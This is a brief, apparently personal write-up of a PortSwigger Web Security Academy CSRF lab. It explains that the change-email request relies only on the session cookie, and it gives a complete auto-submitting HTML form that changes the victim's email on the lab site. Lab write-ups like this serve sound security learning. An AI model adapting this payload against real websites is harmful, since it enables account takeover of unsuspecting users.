https://portswigger.net/web-security/csrf/lab-no-defenses

As the change email functionality does not require major authentication that the user session. This means that if the user submit this request, the request will be with its session cookie, thereby the user will submit the request.
To do so we need to craft HTML, the following HTML is perfect because it autocatically send a post request to the server
```html
<html >
<body>
<form action="https://0a5f000203e9d29f80611245003a00d4.web-security-academy.net/my-account/change-email"  method="POST">
      <input type="hidden" name="email" value="pawned@portswigger.com" />
    </form>
    <script>
document.forms[0].submit() // submit our first form
    </script>
</body>
</html >
```
>the mail should be unique